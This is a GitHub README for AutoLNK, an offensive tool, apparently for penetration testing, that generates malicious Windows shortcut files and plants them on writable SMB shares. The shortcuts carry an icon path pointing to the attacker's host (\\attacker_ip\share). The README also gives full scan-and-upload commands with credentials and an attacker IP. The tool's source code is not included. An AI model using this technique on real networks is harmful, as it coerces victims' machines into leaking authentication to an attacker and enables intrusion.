# AutoLNK LNK Payload Generator and SMB Share Manager

This Python script is designed to generate `.lnk` (shortcut) files, scan SMB shares for write access, upload the generated `.lnk` files to discovered shares, and clean them up later. It is capable of running on both Windows and non-Windows systems.

## Features

- **Generate LNK (Shortcut) Files**: Creates `.lnk` files on both Windows and non-Windows platforms.
- **Scan SMB Shares**: Scans an IP range for writable SMB shares using the `netexec` tool.
- **Upload LNK Files**: Uploads the generated `.lnk` file to discovered writable SMB shares.
- **Cleanup LNK Files**: Deletes previously uploaded `.lnk` files from the SMB shares.
- **Cross-Platform**: Works on both Windows and Linux systems.

## Requirements

### Windows:
- `pywin32` library (for LNK file creation on Windows)

### Linux:
- `pylnk3` library (for LNK file creation on Linux)
- `smbclient` tool (for SMB share interaction)

## Installation

1. Clone the repository:

   ```bash
   git clone https://github.com/Tajnost/AutoLNK.git
   cd AutoLNK.git
   ```

2. Install required Python libraries:

   On Windows:
   ```bash
   pip install pywin32
   ```

   On Linux:
   ```bash
   pip install pylnk3
   ```

3. Ensure that `netexec` and `smbclient` tools are available on your system.

## Usage

The script provides the ability to either generate `.lnk` files, scan SMB shares, upload `.lnk` files, or clean up previously uploaded `.lnk` files. Below is a detailed breakdown of its usage:

### Command-line Arguments

| Argument          | Description                                                                                      | Required |
|-------------------|--------------------------------------------------------------------------------------------------|----------|
| `--target-range`   | The target IP range for SMB scanning (e.g., `192.168.131.0/24`)                                   | Yes      |
| `--username`       | Username for SMB authentication                                                                  | Yes      |
| `--password`       | Password for SMB authentication                                                                  | Yes      |
| `--domain`         | Domain for SMB authentication (use only if domain authentication is required)                    | No       |
| `--local-auth`     | Use this flag for local SMB authentication (disables domain authentication)                      | No       |
| `--host`           | The attacker's IP or hostname to be embedded in the LNK file's icon location                     | Yes      |
| `--output`         | The name of the `.lnk` file to be generated                                                      | Yes      |
| `--execute`        | The command that will be executed when the shortcut is clicked (defaults to `C:\Windows\explorer.exe .`) | No       |
| `--targets-file`   | Path to save the discovered SMB shares (defaults to `/home/kali/targets.txt`)                    | No       |
| `--cleanup`        | Use this flag to remove the uploaded `.lnk` files from the SMB shares                            | No       |

### Example Usage

1. **Generate and Upload LNK Files to SMB Shares**:

   This command generates a `.lnk` file and scans for writable SMB shares within a given IP range. It then uploads the `.lnk` file to the discovered shares.

   ```bash
   python3 lnk_payload_smb.py --target-range 192.168.131.0/24 --username admin --password 'Password123!' --host 192.168.131.10 --output /home/kali/myfile.lnk
   ```

2. **Clean Up Uploaded LNK Files**:

   This command removes the previously uploaded `.lnk` files from the writable SMB shares discovered earlier.

   ```bash
   python3 lnk_payload_smb.py --target-range 192.168.131.0/24 --username admin --password 'Password123!' --cleanup
   ```

## How It Works

1. **LNK File Generation**:
   The script generates a `.lnk` file that points to a specified command (e.g., `cmd.exe`) and assigns a custom icon from a UNC path (`\\attacker_ip\share\file.ico`).

2. **SMB Share Scanning**:
   It uses the `netexec` tool to scan a given IP range for SMB shares with write access.

3. **Uploading LNK Files**:
   The script uploads the `.lnk` file to all writable SMB shares using the `smbclient` tool.

4. **Cleaning Up LNK Files**:
   It removes the uploaded `.lnk` files from the SMB shares using `smbclient`.

## Notes

- Make sure you have appropriate permissions to scan and upload files to the SMB shares.
- The script assumes that the required tools like `netexec` and `smbclient` are installed and available in the system's PATH.
- Wrap passwords in single quotes when using special characters (e.g., `Password123!`) to avoid breaking the command.

![image](https://github.com/user-attachments/assets/41bba42a-8392-4a2d-a476-00ff2193e860)


![image](https://github.com/user-attachments/assets/c1923b63-4d2f-44ba-bd7b-381e0f4370df)



If --cleanup argument is used:

![image](https://github.com/user-attachments/assets/c59d52cc-c812-4548-b7c8-da29d5a499e3)

